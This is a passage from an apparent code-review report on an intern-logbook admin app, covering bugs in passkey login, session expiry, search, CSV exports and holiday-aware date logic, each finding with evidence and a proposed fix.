**Failure:** An admin logs in Monday morning. Tuesday afternoon (>24h later) they click a bookmarked /admin/daily-records. AdminRoute sees a token string and a role, so it renders the page. The page mounts, fires its fetches, all return 401 TOKEN_EXPIRED, handleUnauthorized wipes the session and hard-redirects. The user sees a fully painted admin page flash for ~1 second before being bounced to the login screen — and any in-progress form input on that page is lost.

**Evidence:**
```
AdminRoute.jsx:7 `if (!session?.token || !session?.user?.role) {`; adminAuth.js:1-4 getAdminSession just JSON.parses adminInfo; AdminLogin.jsx:163,218,306 write `loginTime: new Date().toISOString()` and a grep for `loginTime` across frontend/src returns only those writes plus GateStaffLogin.jsx:64.
```

**Fix:** Add an `isAdminSessionValid()` helper in adminAuth.js that base64-decodes the JWT payload and compares `exp * 1000` (or loginTime + 24h) to Date.now(), returning null from getAdminSession when expired; call it from AdminRoute before rendering the Outlet.

## [MEDIUM] Passkey registration ignores HTTP status and only checks `options.error`, feeding an error body into startRegistration
`frontend/src/pages/AdminLogin.jsx:241` · *error-handling*

**What's wrong:** handlePasskeyRegistration does `const options = await resp.json(); if (options.error) throw new Error(options.error);` (lines 239-241) with no `resp.ok` check. The auth middlewares on that route return `{ message, code }`, not `{ error }` — authMiddleware.js:8/21/26 and adminAuth.js:7/11. So a 401/403 body sails past the guard and is handed to `startRegistration({ optionsJSON: options })` at line 243, where SimpleWebAuthn dereferences `optionsJSON.challenge` (undefined) and throws an internal TypeError. The mapping at lines 263-267 only recognises "timed out" and "RP ID" strings, so the modal renders the raw TypeError text.

**Failure:** The backend is restarted with a rotated JWT_SECRET (or the admin's account is deactivated) between the password login and the click on "Enable Passkey Setup". The GET returns 401 {"message":"Invalid Token.","code":"INVALID_TOKEN"}. Instead of "Your session expired, please log in again", the modal shows something like "Cannot read properties of undefined (reading 'replace')" and the admin has no idea what happened. The same holds for any proxy 502 that returns HTML, where resp.json() throws a SyntaxError shown verbatim.

**Evidence:**
```
AdminLogin.jsx:234-243 — fetch without checking resp.ok, `if (options.error) throw` then `startRegistration({ optionsJSON: options })`; authMiddleware.js:26-29 returns `{ message: "Invalid Token.", code: "INVALID_TOKEN" }`; adminAuth.js:7 returns `{ message: "Admin access required.", code: "ADMIN_REQUIRED" }`.
```

**Fix:** After the fetch add `if (!resp.ok) { const body = await resp.json().catch(() => ({})); throw new Error(body.message || body.error || `Request failed (${resp.status})`); }` and do the same for the verify-registration call at line 245 and both authentication-options fetches (lines 139 and 285).

## [MEDIUM] Conditional-UI passkey request is never aborted on unmount and can force-navigate away from another page
`frontend/src/pages/AdminLogin.jsx:176` · *react-effect*

**What's wrong:** The mount effect (lines 133-177) starts a browser-autofill WebAuthn ceremony via `startAuthentication({ optionsJSON: data.options, useBrowserAutofill: true })` (line 147) and returns no cleanup function — line 176 is a bare `setupAutofill();` and the effect returns undefined. A conditional-mediation credentials.get() stays pending until it resolves or is explicitly aborted; nothing here creates an AbortController or calls SimpleWebAuthn's abort service on unmount. When the promise later resolves, the continuation still runs and unconditionally writes localStorage and calls `navigate("/admin/dashboard")` (lines 160-166).

**Failure:** An admin opens /admin-login on a laptop that has an admin passkey, then realises they wanted the intern portal and clicks "Login as Intern" (line 724), which navigates to "/". AdminLogin unmounts but the conditional request is still live. On the intern login page the browser still offers the admin passkey in the email field's autofill dropdown; if the user picks it, the orphaned continuation stores adminInfo and yanks them to /admin/dashboard mid-typing.

**Evidence:**
```
AdminLogin.jsx:133-177 — `useEffect(() => { const setupAutofill = async () => {...}; setupAutofill(); }, [navigate]);` with no `return () => ...`; line 147 `startAuthentication({ optionsJSON: data.options, useBrowserAutofill: true })`; lines 165-166 `localStorage.setItem("adminInfo", ...); navigate("/admin/dashboard");`.
```

**Fix:** Track a `let cancelled = false` in the effect, return `() => { cancelled = true; WebAuthnAbortService.cancelCeremony(); }` from @simplewebauthn/browser, and bail out of the verification/navigate branch when `cancelled` is true.

## [MEDIUM] Autofill passkey path silently swallows a failed verification — nothing happens after the biometric prompt
`frontend/src/pages/AdminLogin.jsx:159` · *error-handling*

**What's wrong:** In setupAutofill the verification result is handled with `if (verificationJSON.verified) { ...navigate... }` (lines 159-167) and no `else`. When the backend returns a non-verified response the branch is skipped, no `setError` is called, and the function simply exits. The backend returns 404 `{ error: "No user found for this passkey" }` (webauthnController.js:198), 400 `{ error: "Authentication session expired or invalid" }` (line 164) and 400 `{ error: "Authentication failed" }` (line 231) — none of which set `verified`. The manual button path at line 310 does throw in this case, but the autofill path does not.

**Failure:** An admin's passkey was wiped from the database (or the 5-minute challenge in webauthnController.js:148 expired because they left the page open). They click the email field, the browser shows their passkey, they scan their fingerprint, the OS shows success — and the page does absolutely nothing. No spinner, no error, no navigation. They retry repeatedly with no feedback.

**Evidence:**
```
AdminLogin.jsx:158-167 — `const verificationJSON = await verificationResp.json(); if (verificationJSON.verified) { ... navigate(...) }` closing at line 167 with no else, contrasted with the manual path at AdminLogin.jsx:310-312 `} else { throw new Error(verificationJSON.error || "Authentication verification failed"); }`.
```

**Fix:** Add an else branch that calls `setError(verificationJSON.error || "Passkey sign-in failed. Please use your password.")`, matching handlePasskeyLogin.

## [MEDIUM] Passkey setup modal is shown after every password login, and fails with InvalidStateError for admins who already registered
`frontend/src/pages/AdminLogin.jsx:223` · *logic*

**What's wrong:** handleSubmit unconditionally calls `setShowPasskeyPrompt(true)` (line 223) on every successful password login. Nothing checks whether the account already has a passkey — `data.user` from createAdminSession (authService.js:24) carries only {id,name,email,picture,role,permissions}, so the frontend has no passkey flag to check, and no such check is attempted. On the backend, generateRegistrationOptions builds `excludeCredentials` from the user's existing passkeys (webauthnController.js:58-62), which makes the authenticator reject a re-registration with InvalidStateError. The error mapping at lines 263-267 handles only "timed out" and "RP ID", so the raw message surfaces.

**Failure:** An admin who enabled a passkey last week logs in with their password on the same laptop. The "Enable Passkey" modal appears again. They click "Enable Passkey Setup", the OS prompts, and the modal shows "The authenticator was previously registered". They must click "Skip for now" every single login, and the error makes it look like the system is broken.

**Evidence:**
```
AdminLogin.jsx:221-223 `localStorage.setItem("adminInfo", JSON.stringify(adminInfo)); setAuthDataForPasskeySetup(adminInfo); setShowPasskeyPrompt(true);` with no passkey-existence condition; webauthnController.js:58-62 `excludeCredentials: userPasskeys.map(pk => ({ id: pk.credentialID, ... }))`; authService.js:24 the user payload has no passkey field.
```

**Fix:** Return `hasPasskey: (user.passkeys?.length || 0) > 0` from createAdminSession (authService.js:24) and gate line 223 on `!data.user.hasPasskey`; also map InvalidStateError to a friendly "This device already has a passkey for your account."

## [MEDIUM] Passkey modal traps the admin: "Skip for now" is disabled while registration is pending, with no timeout or escape
`frontend/src/pages/AdminLogin.jsx:400` · *ux*

**What's wrong:** The modal is a full-screen `fixed inset-0 z-50` overlay (line 336) with no backdrop-click handler and no Escape key handler. Both of its buttons are disabled while `passkeyLoading` is true — "Enable Passkey Setup" at line 378 and "Skip for now" at line 400. `passkeyLoading` is set true at line 232 and only cleared in the `finally` at line 271, which cannot run until the fetch and the `startRegistration` WebAuthn promise settle. Neither fetch uses an AbortController or a timeout, and the WebAuthn ceremony waits on the user's OS prompt.

**Failure:** An admin logs in, clicks "Enable Passkey Setup", and the OS security prompt opens behind another window (or the network stalls on the generate-registration-options GET). Both buttons are now greyed out under a full-screen overlay with no close control. The admin cannot reach the dashboard or the login form and must hard-refresh the browser to escape.

**Evidence:**
```
AdminLogin.jsx:336 `<div className="fixed inset-0 z-50 ...">` with no onClick; line 378 `disabled={passkeyLoading}` on the register button; line 400 `disabled={passkeyLoading}` on the "Skip for now" button; lines 231-272 set passkeyLoading true at 232 and false only in the finally at 271.
```

**Fix:** Remove `disabled={passkeyLoading}` from the "Skip for now" button (line 400) so the admin can always bail out, and add an AbortController with a timeout on the two fetches.

## [LOW] Login navigates with a history push, so the browser Back button returns a logged-in admin to the login form
`frontend/src/pages/AdminLogin.jsx:278` · *ux*

**What's wrong:** All four post-login navigations use `navigate("/admin/dashboard")` without `{ replace: true }` — lines 166, 256, 278 and 309. The login page therefore stays in the history stack. Every other logout/expiry path in the app deliberately uses replace (sessionUtils.js:34-40 comments this out explicitly: "use replace so the browser back button doesn't return to the protected page").

**Failure:** An admin logs in, lands on the dashboard, then presses the browser Back button (e.g. reflexively after opening a detail page and going back twice). They land on the /admin-login form even though they are still authenticated, with the mount effect re-launching a conditional passkey prompt. They have to retype credentials or press Forward.

**Evidence:**
```
AdminLogin.jsx:166 `navigate("/admin/dashboard");`, line 256 `navigate("/admin/dashboard");`, line 278 `navigate("/admin/dashboard");`, line 309 `navigate("/admin/dashboard");` — none pass `{ replace: true }`, unlike AdminRoute.jsx:8 which does use `replace`.
```

**Fix:** Change all four to `navigate(dest, { replace: true })`.

## [LOW] Stale passkey error stays visible when the admin retries registration
`frontend/src/pages/AdminLogin.jsx:232` · *react-state*

**What's wrong:** handlePasskeyRegistration sets `setPasskeyLoading(true)` at line 232 but never calls `setPasskeyError("")`. `passkeyError` is only cleared in skipPasskeyRegistration (line 277), which immediately navigates away. So the red error banner rendered at lines 352-373 persists through every retry attempt.

**Failure:** An admin clicks "Enable Passkey Setup", cancels the OS prompt, and sees "The operation timed out or was cancelled. Please try again." They click the button again; the old red banner stays on screen for the entire second attempt, and if the second attempt succeeds they briefly see the failure message while the navigation runs — making a successful registration look like it failed.

**Evidence:**
```
AdminLogin.jsx:231-233 `const handlePasskeyRegistration = async () => { setPasskeyLoading(true); try {` — no setPasskeyError("") reset; the banner is rendered at AdminLogin.jsx:352 `{passkeyError && (`; the only reset is at line 277 inside skipPasskeyRegistration.
```

**Fix:** Add `setPasskeyError("");` immediately after line 232.

# AdminDashboard — 26 findings

## [CRITICAL] A 403 (insufficient permission) wipes the admin session and causes a permanent login loop
`frontend/src/pages/AdminDashboard.jsx:167` · *permissions-auth*

**What's wrong:** fetchData() treats any error whose message contains "403" as an authentication failure: it deletes localStorage.adminInfo and redirects to /admin-login. But GET /api/admin/dashboard/stats returns 403 for a *permission* failure (enforceRoutePermission -> requirePermission("dashboard.view") in backend/middleware/adminAuth.js:30,41), not an auth failure. Since AdminLogin.jsx redirects every successful admin login to /admin/dashboard (lines 185/275/297/328), an admin whose permission set omits "dashboard.view" is logged out the instant they log in, forever. Custom permission sets are creatable: backend/controllers/adminUserController.js:7-13 sanitizePermissions only intersects the requested list with ALL_PERMISSIONS and never force-adds dashboard.view.

**Failure:** A super_admin creates a user with role "admin" and permissions ["attendance.view","attendance.manage"]. That user signs in with Google -> AdminLogin navigates to /admin/dashboard -> getDashboardStats() gets 403 {code:"FORBIDDEN"} -> adminApi throws "Failed to fetch dashboard stats: 403" -> AdminDashboard removes adminInfo and navigates to /admin-login. The user logs in again and the identical loop repeats. They can never reach /admin/intern-attendance or any other page they DO have rights to.

**Evidence:**
```
AdminDashboard.jsx:167-170  `if (error.message.includes("403") || error.message.includes("401")) { localStorage.removeItem("adminInfo"); navigate("/admin-login"); }`  ||  adminAuth.js:30 `if (path.startsWith("/dashboard")) return "dashboard.view";` and :24 `return res.status(403).json({ message: \`Permission required: ${permission}\`, code: "FORBIDDEN" });`  ||  adminUserController.js:8 `const selected = (Array.isArray(permissions) ? permissions : permissionsForRole(role)).filter((item) => ALL_PERMISSIONS.includes(item));`
```

**Fix:** Only clear the session on 401 (adminApi's checkAuth already handles that via handleUnauthorized). On 403, render an "You do not have permission to view the dashboard" state and keep the session, or gate the page with hasAdminPermission("dashboard.view") and redirect to the first page the user is allowed to see.

## [HIGH] Search failure leaves the results dropdown spinning "Searching..." forever with no error shown
`frontend/src/pages/AdminDashboard.jsx:188` · *error-handling*

**What's wrong:** The catch block of searchInterns() resets internReport to [] but never sets hasSearched, and never sets any error state. The dropdown body is driven exclusively by hasSearched (line 632: `{!hasSearched ? (spinner "Searching...") : ...}`), while searchLoading (which only drives the small spinner in the input) is reset in the finally block. So after a failed request the dropdown is stuck on the loading branch permanently.

**Failure:** Admin types "kavindu" while the API is down (or the request 500s — see the unescaped-regex finding). searchLoading goes false so the input spinner stops, but the results panel keeps showing the spinning icon and the text "Searching..." indefinitely. The admin waits, retypes, and never learns the search failed. If a previous search had succeeded, hasSearched is still true and the panel instead says "No interns found" — telling the admin the intern does not exist when in fact the request errored.

**Evidence:**
```
AdminDashboard.jsx:188-191 `} catch (error) { console.error("Error searching interns:", error); setInternReport([]); } finally { setSearchLoading(false); }` — no setHasSearched(true), no error state. Rendered by :632 `{!hasSearched ? (<div>...<p>Searching...</p></div>) : filteredInterns.length === 0 ? ... }`
```

**Fix:** Add a searchError state; in the catch set setHasSearched(true) and setSearchError(msg), and render an error branch in the dropdown before the empty branch.

## [HIGH] Search box 500s on regex metacharacters — backend builds a RegExp from raw user input
`backend/controllers/adminController.js:490` · *crash*

**What's wrong:** searchInterns builds `new RegExp(searchTerm, "i")` directly from the ?q= query string with no escaping. Any input that is not a valid regex throws a SyntaxError inside the try, producing a 500 "Failed to search interns". Valid-but-metacharacter input also silently changes matching semantics (e.g. "." matches every intern), and unbounded user regex on Intern.find is a ReDoS vector.

**Failure:** Admin types "C++" (a very plausible field-of-specialization search) into the dashboard search box. Backend evaluates `new RegExp("C++", "i")` -> SyntaxError: Nothing to repeat -> caught by the outer catch -> HTTP 500. The frontend's swallow-catch then leaves the dropdown stuck on "Searching..." forever. Same for "(", "[", "a{2", or a name typed as "Perera (IT)".

**Evidence:**
```
adminController.js:490 `const searchRegex = new RegExp(searchTerm, "i");` then :493-499 `Intern.find({ $or: [{ Trainee_Name: searchRegex }, { Trainee_ID: searchRegex }, { Trainee_Email: searchRegex }] })`. Compare adminController.js:607-608 which uses `{ $regex: search, $options: "i" }` — also unescaped but at least does not throw client-side.
```

**Fix:** Escape the term before building the regex: `const escaped = searchTerm.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"); const searchRegex = new RegExp(escaped, "i");`

## [HIGH] "Previous Day" export skips weekends but not public holidays — reports every intern as a non-submitter on a Poya day
`frontend/src/pages/AdminDashboard.jsx:331` · *date-logic*

**What's wrong:** handleExportPreviousDayNonSubmissions rolls back only Saturday/Sunday (getUTCDay 0/6). Sri Lankan public holidays are ignored, even though the rest of the codebase is holiday-aware via backend/utils/workingDays.js getPastWorkingDays()/isWorkingDay(), which consults getSriLankanHolidays(). The backend endpoint it calls (getWeeklyNonSubmissions with startDate===endDate) then flags every active intern with zero submissions in that range as a non-submitter (isCustomRange => `count === 0`).

**Failure:** Friday 2026-08-28. Admin clicks "Previous Day". Yesterday = Thursday 2026-08-27, which is a listed Sri Lankan public holiday (workingDays.js:37, the 2026 lunarApprox list) — the office was closed and nobody logged. day===4 so no rollback happens; the request is startDate=endDate=2026-08-27; the backend finds zero DailyRecords in that window and returns EVERY active intern in nonSubmittedInterns. The admin downloads a CSV listing the entire intern population as delinquent and the alert claims "Previous day non-submissions CSV report with 214 interns downloaded successfully".

**Evidence:**
```
AdminDashboard.jsx:332-336 `const day = yesterday.getUTCDay(); if (day === 0) ...; if (day === 6) ...; const dateStr = yesterday.toISOString().split("T")[0];` — no holiday check. Backend adminController.js:1124-1127 `const nonSubmittedInterns = activeInterns.filter((intern) => { const count = submissionCountMap.get(intern._id.toString()) || 0; return isCustomRange ? count === 0 : count < requiredSubmissions; });`. Holiday set at workingDays.js:34-39 includes "2026-08-27".
```

**Fix:** Expose/reuse the holiday-aware helper (e.g. call a backend endpoint or port isWorkingDay) and keep stepping back until the candidate date is a real working day; alternatively have the backend compute "previous working day" itself via getPastWorkingDays(1).

## [HIGH] Reversed custom date range silently reports 100% of interns as non-submitters
`frontend/src/pages/AdminDashboard.jsx:372` · *validation*

**What's wrong:** handleExportWeeklyNonSubmissionsCSV passes customStartDate/customEndDate straight to the API with no check that start <= end. The backend builds `createdAt: { $gte: startDate, $lte: endDate }` which matches nothing when the range is inverted, and because isCustomRange uses the strict `count === 0` rule, every active intern is classified as a non-submitter.

**Failure:** Admin fills the range as 2026-08-10 (left box) to 2026-08-01 (right box) — an easy slip since the boxes are unlabeled `to`. The Mongo query returns 0 records, submissionCountMap is empty, and the CSV downloads containing every active intern with status "No Submissions In Selected Range". The success alert reports e.g. "…with 214 interns downloaded successfully. Period: Mon Aug 10 2026 to Sat Aug 01 2026". Nothing warns the admin the range was invalid.

**Evidence:**
```
AdminDashboard.jsx:372-376 `if (customStartDate && customEndDate) { weeklyNonSubmissionsData = await adminApi.getWeeklyNonSubmissions({ startDate: customStartDate, endDate: customEndDate }); }` — no ordering check. Backend adminController.js:1085-1089 `DailyRecord.find({ createdAt: { $gte: startDate, $lte: endDate } })` and :1126 `return isCustomRange ? count === 0 : count < requiredSubmissions;`
```

**Fix:** Validate before calling: if (new Date(customStartDate) > new Date(customEndDate)) show an error and return; also set the `min`/`max` attributes on the two date inputs from each other. Add a matching 400 guard in getWeeklyNonSubmissions.

## [HIGH] "Submissions" export silently exports only the active search results, with blank start/end dates
`frontend/src/pages/AdminDashboard.jsx:214` · *export-correctness*

**What's wrong:** handleExportSubmittedCSV uses internReport (which is populated ONLY by the search dropdown) whenever it is non-empty, and falls back to the full getInternReport() only when it is empty. The card's own copy says "Export a complete CSV of all currently submitted interns". Worse, the search endpoint's objects do not contain trainingStartDate/trainingEndDate (adminController.js:542-563 omits them), while csvUtils.convertToCSV emits Start Date / End Date columns — so every row in the search-derived CSV reads ="Not Set". The isOverdue flag also differs between the two sources (search = "no submission in 3 calendar days", report = "no submission in 5 working days"), so the same intern can be included or excluded depending on whether a search happened to be open.

**Failure:** Admin types "kav" to look someone up, leaves the query in the box, then clicks the "Submissions" card. Instead of the full submitted-interns list they get a 2-row CSV whose Start Date and End Date columns are all ="Not Set", and the alert says "Submitted interns CSV report with 2 interns downloaded successfully" — which reads like the whole organisation only has 2 submitting interns.

**Evidence:**
```
AdminDashboard.jsx:214-224 `if (internReport && internReport.length > 0) { submittedInterns = internReport.filter(...) } else { const allInterns = await adminApi.getInternReport(); ... }`. internReport is set only at :186 `setInternReport(reportData)` from adminApi.searchInterns and cleared at :162. Backend search payload adminController.js:542-563 has no trainingStartDate/trainingEndDate, consumed by adminApi.js:573-578 `intern.trainingStartDate ? formatDateForExport(...) : '="Not Set"'`.
```

**Fix:** Always call adminApi.getInternReport() for this export (it is the documented "complete" export), or add a separate explicit "Export search results" action and label it as such.

## [HIGH] Non-Submissions export counts differ from the dashboard KPI: the export includes test accounts and ignores public holidays
`backend/controllers/adminController.js:752` · *data-consistency*

**What's wrong:** The "Non-Submissions" KPI card reads dashboardStats.nonSubmittingInterns, computed by getDashboardStats over getActiveInternsQuery() (excludes isTestAccount, not-yet-started and finished interns) counting DailyRecord.date against the holiday-aware getPastWorkingDays(5). The "Non-Submissions" export button hits /admin/non-submissions-within-week, whose getNonSubmissionsWithinAWeek uses `Intern.find({})` (every document, test accounts included) and a local getWorkingDays() helper that only skips Saturday/Sunday, ignoring the Sri Lankan holiday list entirely. The same mismatch applies to the Submissions export, which calls getInternReport -> `Intern.find({}).lean()`.

**Failure:** The KPI card shows "7 Non-Submissions". The admin clicks the Non-Submissions card and the downloaded CSV has 15 rows: it includes seeded test-account interns (isTestAccount: true) that the KPI excludes, and — in a week containing Poya Thursday 2026-08-27 — it treats the holiday as a required working day, so interns who logged on all 4 actual working days are counted as having only 3-of-5 and appear in the report. The admin emails that CSV to management as the authoritative list.

**Evidence:**
```
adminController.js:752 `const allInterns = await Intern.find({});` and :663-677 `const getWorkingDays = (startDate, endDate) => { ... if (dayOfWeek !== 0 && dayOfWeek !== 6) { workingDays.push(new Date(current)); } ... }` (no holiday filter). Contrast adminController.js:49-56 `const checkWindow = getPastWorkingDays(5); const activeQuery = getActiveInternsQuery(); ... Intern.find(activeQuery).lean()` and workingDays.js:133 `if (dow !== 0 && dow !== 6 && !holidays.has(dateStr))`. Also adminController.js:198 `const interns = await Intern.find({}).lean();` in getInternReport.
```

**Fix:** Make getNonSubmissionsWithinAWeek and getInternReport use getActiveInternsQuery() and the shared getWorkingDaysInRange/getPastWorkingDays helpers from utils/workingDays.js so the KPI and the exports are computed from one definition.

## [HIGH] "Non-Submissions" KPI card and "Non-Submissions" CSV export use two different algorithms and return different numbers
`backend/controllers/adminController.js:756` · *api-contract / logic*

**What's wrong:** The KPI card value comes from GET /admin/dashboard/stats, which counts a non-submitter as: active intern (`getActiveInternsQuery()` — excludes test accounts and out-of-window trainings) with fewer than 3 DailyRecords whose **`date` string** is in `getPastWorkingDays(5)` (weekends *and* Sri Lankan public holidays excluded, computed in Asia/Colombo). The "Non-Submissions" export button hits GET /admin/non-submissions-within-week, which uses a completely separate implementation: `Intern.find({})` (no active/test filter), a window derived by a hand-rolled loop that only skips Sat/Sun (**holidays are counted as working days**), and matching on **`createdAt` timestamps** in server-local time rather than the authoritative `date` string. The two lists therefore disagree systematically.

**Failure:** On a week containing a Poya holiday (e.g. 2026-08-27), the dashboard card reads "Non-Submissions: 12" because `getPastWorkingDays(5)` skipped the holiday and only looked at real working days. The admin clicks the "Non-Submissions" export card and receives a CSV with ~40 rows, because that endpoint treated the holiday as a required working day and also included test accounts. The admin then emails a non-submission warning list that includes interns who were compliant.

**Evidence:**
```
backend/controllers/adminController.js:49  const checkWindow = getPastWorkingDays(5);   // holiday-aware, matches DailyRecord.date strings
backend/controllers/adminController.js:52  const activeQuery = getActiveInternsQuery();
vs.
backend/controllers/adminController.js:729-741  while (workingDaysCount < 5) { ... if (dayOfWeek !== 0 && dayOfWeek !== 6) { workingDaysCount++; ... } }   // no holiday exclusion
backend/controllers/adminController.js:752  const allInterns = await Intern.find({});    // no active / isTestAccount filter
backend/controllers/adminController.js:756-760  const records = await DailyRecord.find({ createdAt: { $gte: startDate, $lte: today } })
```

**Fix:** Rewrite `getNonSubmissionsWithinAWeek` on top of the same primitives the stats endpoint uses: `getActiveInternsQuery()`, `getPastWorkingDays(5)`, and `{ date: { $in: checkWindow } }`; or have it reuse the `nonSubmissionsList` the stats controller already builds.

## [HIGH] Search-result status badge uses a 3-calendar-day rule while the KPI card uses a 3-logs-in-5-working-days rule
`backend/controllers/adminController.js:538` · *logic / data-consistency*

**What's wrong:** `getStatusBadge` (AdminDashboard.jsx:419) renders `Non-Submitting` when `intern.isNonSubmitting || intern.isOverdue`. For the normal search path the backend sets `isOverdue` = last `createdAt` older than 3 *calendar* days (and never sets `isNonSubmitting`), whereas the "Non-Submissions" KPI on the same screen counts an intern as non-submitting only if they logged fewer than 3 times in the last 5 *working* days. Note the same controller's `q === "*"` branch (line 447-452) uses the correct working-day rule, so the two branches of one endpoint disagree with each other too.

**Failure:** An intern submits logs on Mon, Tue, Wed but nothing Thu/Fri. On Monday morning the KPI card counts them under "Submitted" (3 logs in the last 5 working days). The admin searches their name; the dropdown row shows a red "Non-Submitting" badge, because the last `createdAt` is 5 calendar days old > 3. Two contradictory statuses for the same intern on the same page. The same happens across every weekend: any intern whose last log was Friday shows "Non-Submitting" from Monday onward.

**Evidence:**
```
backend/controllers/adminController.js:526-540
      const threeDaysAgo = new Date();
      threeDaysAgo.setDate(threeDaysAgo.getDate() - 3);
      ...
      const isOverdue =
        !isWithinGracePeriod &&
        (!lastSubmission || new Date(lastSubmission.createdAt) < threeDaysAgo);
vs backend/controllers/adminController.js:447-452 (the `*` branch of the SAME function)
          const checkWindow = getPastWorkingDays(5);
          const periodLogsCount = internRecords.filter((r) => checkWindow.includes(r.date)).length;
          const isNonSubmitting = !inGrace && periodLogsCount < MIN_WEEKLY_LOGS_REQUIRED;
Frontend consumer: frontend/src/pages/AdminDashboard.jsx:420 `if (intern.isNonSubmitting || intern.isOverdue)`
```

**Fix:** Delete the 3-calendar-day block and reuse the `getPastWorkingDays(5)` + `MIN_WEEKLY_LOGS_REQUIRED` logic already present in the `*` branch, returning both `isNonSubmitting` and `isOverdue` from it.

## [MEDIUM] Debounced search has no cancellation — a slow earlier response overwrites the newer one
`frontend/src/pages/AdminDashboard.jsx:176` · *race-condition*

**What's wrong:** The 500 ms debounce only cancels a pending *timer*, not an in-flight request. Once a fetch has started, a subsequent query fires a second fetch with no AbortController and no request-sequence guard, and whichever response resolves last calls setInternReport. There is also no key check that the response corresponds to the current searchTerm.

**Failure:** Admin types "sa", pauses ~600 ms (request A for "sa" fires and is slow — it scans every intern), then types "mantha" so the box reads "samantha"; 500 ms later request B fires and returns quickly, rendering Samantha. Request A then resolves and overwrites state, so the dropdown lists every intern matching "sa" while the input still reads "samantha". Clicking a row navigates to the wrong intern's detail page.

**Evidence:**
```
AdminDashboard.jsx:176-203 — `searchInterns` does `const reportData = await adminApi.searchInterns(searchQuery.trim()); setInternReport(reportData);` with no abort signal, and the effect `useEffect(() => { const timeoutId = setTimeout(() => searchInterns(searchTerm), 500); return () => clearTimeout(timeoutId); }, [searchTerm, searchInterns]);` cleans up the timer only.
```

**Fix:** Create an AbortController per request, pass its signal down through adminApi.searchInterns, and abort it in the effect cleanup; or capture a monotonically increasing request id and discard the response if a newer request has started.

## [MEDIUM] Non-submission report's startDate/weekPeriod label is one day early on a Sri Lanka (UTC+5:30) server
`backend/controllers/adminController.js:925` · *timezone*

**What's wrong:** getNonSubmissionsWithinAWeek builds startDate as *local* midnight (`startDate.setHours(0,0,0,0)`) and then serialises it with `.toISOString().split("T")[0]`. On any UTC+ server (Asia/Colombo is UTC+5:30) local midnight is 18:30 UTC of the *previous* day, so the emitted startDate and the weekPeriod label are one calendar day earlier than the window actually queried. endDate is unaffected because 23:59:59 local is still the same UTC day. The dashboard puts that value straight into the downloaded filename and into the success alert.

**Failure:** Server clock in Asia/Colombo; the real 5-working-day window starts Mon 2026-07-27 00:00 +0530. The API returns startDate:"2026-07-26" and weekPeriod:"2026-07-26 to 2026-08-04". The admin downloads a file named weekly_non_submissions_from_2026-07-26.csv and the alert says the period covers Sunday 26 July — a day that was never part of the check. Anyone reconciling the report against the calendar concludes the window is wrong.

**Evidence:**
```
adminController.js:737-738 `startDate = new Date(currentDate); startDate.setHours(0, 0, 0, 0);` then :914 `const weekPeriodLabel = \`${startDate.toISOString().split("T")[0]} to ${today.toISOString().split("T")[0]}\`;` and :925 `startDate: startDate.toISOString().split("T")[0],`. Consumed at AdminDashboard.jsx:291-296 `const startDateStr = weeklyNonSubmissionsData.startDate || ...; await csvUtils.downloadInternReport(weeklyNonSubmissionsData, \`weekly_non_submissions_from_${startDateStr}\`);` and in the alert at :299-301.
```

**Fix:** Format local dates with local getters (`${d.getFullYear()}-${pad(d.getMonth()+1)}-${pad(d.getDate())}`) or use moment.tz(d, "Asia/Colombo").format("YYYY-MM-DD") instead of toISOString().

## [MEDIUM] Interns whose training ends on the report's end date are dropped from the non-submission report
`backend/controllers/adminController.js:1054` · *off-by-one*

**What's wrong:** getWeeklyNonSubmissions excludes an intern when `internEndDateStr <= reportEndDateStr`. An intern whose last training day IS the reported day was still active and still owed a logbook entry for it, so the comparison should be strictly `<`. This affects the "Previous Day" card and the custom-range card, which both send startDate===endDate / an explicit range.

**Failure:** Intern IN2451's Training_EndDate is Friday 2026-08-07 — their final working day. On Monday 2026-08-10 the admin runs "Previous Day"/custom range for 2026-08-07. IN2451 submitted nothing that day, but the filter excludes them because "2026-08-07" <= "2026-08-07", so the missing final-day log never appears in the report and is never chased.

**Evidence:**
```
adminController.js:1051-1059 `if (intern.Training_EndDate) { const internEndDateStr = toDateString(intern.Training_EndDate); if (internEndDateStr <= reportEndDateStr) { ... return false; } }`
```

**Fix:** Change the comparison to `internEndDateStr < reportStartDateStr` (exclude only interns who had already finished before the window opened); reportStartDateStr is already computed on line 1048 but never used.

## [MEDIUM] sortByTraineeId is silently discarded — exported CSVs are ordered by training start date
`frontend/src/pages/AdminDashboard.jsx:282` · *logic-error*

**What's wrong:** All three non-submission handlers sort nonSubmittedInterns by trainee ID before handing the payload to csvUtils.downloadInternReport, but both CSV converters re-sort the array by trainingStartDate before writing rows. The page's sort therefore has zero effect on the produced file.

**Failure:** Admin clicks "Non-Submissions" expecting the CSV ordered by trainee ID (IN2401, IN2402, IN2403 …) as the code intends. The delivered file is ordered by training start date, so trainee IDs are scattered (IN2455, IN2401, IN2478 …), making manual reconciliation against the ID-sorted master roster tedious and error-prone.

**Evidence:**
```
AdminDashboard.jsx:270-276 `const sortByTraineeId = (interns) => [...interns].sort((a, b) => (a.traineeId || "").localeCompare(...))` applied at :282-284, :343-345 and :387-389 — then overridden in frontend/src/api/adminApi.js:784-792 `const sortedInterns = [...data.nonSubmittedInterns].sort((a, b) => { const dateA = a.trainingStartDate ? new Date(a.trainingStartDate) : new Date(0); ... return dateA - dateB; });` (identical code at adminApi.js:624-632).
```

**Fix:** Drop the re-sort inside convertWeeklyNonSubmissionsToCSV / convertWeeklyNonSubmissionsWithinWeekToCSV and honour the incoming order, or delete sortByTraineeId from the page so the intent is not misleading.

## [MEDIUM] Export buttons are never disabled while a download is in flight — double-click fires duplicate reports
`frontend/src/pages/AdminDashboard.jsx:703` · *double-submit*

**What's wrong:** None of the five export controls (Submissions, On-Leave, Non-Submissions, Previous Day, Custom Range Download) track or reflect an in-flight state; there is no `disabled` prop and no per-action loading flag (activeExport is declared at line 146 but never assigned). Each of these endpoints is expensive — getNonSubmissionsWithinAWeek loads every intern, every record in range, plus a full-collection $group aggregation.

**Failure:** The Non-Submissions report takes ~6 s. The admin clicks the card, sees no feedback at all, and clicks again. Two full report computations run on the server, two identical CSVs land in the Downloads folder (weekly_non_submissions_from_2026-07-27.csv and ...(1).csv), and two blocking alert() dialogs stack up which must both be dismissed.

**Evidence:**
```
AdminDashboard.jsx:703-707 `<motion.button onClick={handleExportSubmittedCSV} whileHover=... whileTap=...>` — no disabled attribute; same at :719-722, :735-738, :751-754 and :793-797. `const [activeExport, setActiveExport] = useState(null);` (line 146) is never set anywhere in the file.
```

